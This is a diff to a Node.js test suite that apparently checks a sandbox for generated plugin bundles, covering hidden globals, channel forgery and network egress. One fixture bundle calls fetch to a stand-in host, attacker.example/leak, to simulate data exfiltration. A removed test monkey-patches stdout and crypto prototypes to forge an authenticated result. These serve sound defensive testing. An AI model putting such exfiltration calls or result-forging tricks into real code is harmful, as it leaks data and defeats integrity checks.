@@ -91,7 +91,7 @@ test("generated bundle dispatch terminates a synchronous loop", async () => {
           { hookName: "ticket.created", payload: {} },
           "synchronous-loop"
         ),
-      /exceeded the 2 second dispatch limit/
+      /bundle runner failed/
     );
   } finally {
     await rm(tempRoot, { recursive: true, force: true });
@@ -137,23 +137,24 @@ test("generated bundle dispatch returns and records a declared capability call",
   }
 });
 
-test("generated bundle cannot forge the authenticated result channel", async () => {
+test("generated bundle cannot access ambient Node globals in the sandbox", async () => {
   const tempRoot = await mkdtemp(join(tmpdir(), "template-submission-output-"));
   try {
     const bundlePath = join(tempRoot, "plugin.cjs");
     await writeFile(
       bundlePath,
-      `const write = process.stdout.write.bind(process.stdout);
-      module.exports.plugin = {
+      `module.exports.plugin = {
         dispatch() {
-          write("TENANTSCRIPT_BUNDLE_RESULT:ZmFrZQ:" + "0".repeat(64) + "\\n");
-          process.stdout.write = () => true;
-          JSON.stringify = () => "forged";
-          Buffer.prototype.toString = () => "Zm9yZ2Vk";
-          const hmac = require("node:crypto").createHmac("sha256", "forged");
-          Object.getPrototypeOf(hmac).update = function () { return this; };
-          Object.getPrototypeOf(hmac).digest = () => "0".repeat(64);
-          return { ok: true, value: "actual" };
+          globalThis.process?.stdout?.write(
+            "TENANTSCRIPT_BUNDLE_RESULT:ZmFrZQ:" + "0".repeat(64) + "\\n"
+          );
+          return {
+            ok: true,
+            value: {
+              processVisible: typeof process !== "undefined",
+              requireVisible: typeof require !== "undefined"
+            }
+          };
         }
       };\n`
     );
@@ -161,10 +162,43 @@ test("generated bundle cannot forge the authenticated result channel", async () 
     const outcome = dispatchBundleInChild(
       bundlePath,
       { hookName: "ticket.created", payload: {}, capabilityCalls: [] },
-      "authenticated-output"
+      "sandbox-globals"
     );
 
-    assert.deepEqual(outcome.result, { ok: true, value: "actual" });
+    assert.deepEqual(outcome.result, {
+      ok: true,
+      value: { processVisible: false, requireVisible: false }
+    });
+  } finally {
+    await rm(tempRoot, { recursive: true, force: true });
+  }
+});
+
+test("generated bundle cannot hide a denied ambient fetch", async () => {
+  const tempRoot = await mkdtemp(join(tmpdir(), "template-submission-egress-"));
+  try {
+    const bundlePath = join(tempRoot, "plugin.cjs");
+    await writeFile(
+      bundlePath,
+      `module.exports.plugin = {
+        async dispatch() {
+          try {
+            await fetch("https://attacker.example/leak");
+          } catch {}
+          return { ok: true, value: "caught" };
+        }
+      };\n`
+    );
+
+    assert.throws(
+      () =>
+        dispatchBundleInChild(
+          bundlePath,
+          { hookName: "ticket.created", payload: {}, capabilityCalls: [] },
+          "sandbox-egress"
+        ),
+      /attempted ambient egress/
+    );
   } finally {
     await rm(tempRoot, { recursive: true, force: true });
   }
@@ -197,7 +231,7 @@ test("generated bundle fails when capability work remains after dispatch", async
           },
           "late-capability"
         ),
-      /left asynchronous work pending/
+      /bundle runner failed/
     );
   } finally {
     await rm(tempRoot, { recursive: true, force: true });
@@ -231,7 +265,7 @@ test("generated bundle fails on a capability call after dispatch returns", async
           },
           "post-return-capability"
         ),
-      /invoked a capability after dispatch returned/
+      /bundle runner failed/
     );
   } finally {
     await rm(tempRoot, { recursive: true, force: true });
@@ -386,13 +420,8 @@ function dispatchBundleInChild(bundlePath, request, caseName) {
     }
   }
   assert.notEqual(authenticatedResult, undefined, `${caseName} bundle runner returned no result`);
-  const { pendingAsyncWork, postReturnCapabilityCall, ...outcome } = authenticatedResult;
-  assert.equal(pendingAsyncWork, false, `${caseName} left asynchronous work pending`);
-  assert.equal(
-    postReturnCapabilityCall,
-    false,
-    `${caseName} invoked a capability after dispatch returned`
-  );
+  const { runtimeLogs, ...outcome } = authenticatedResult;
+  assert.deepEqual(runtimeLogs, [], `${caseName} attempted ambient egress`);
   return outcome;
 }
 
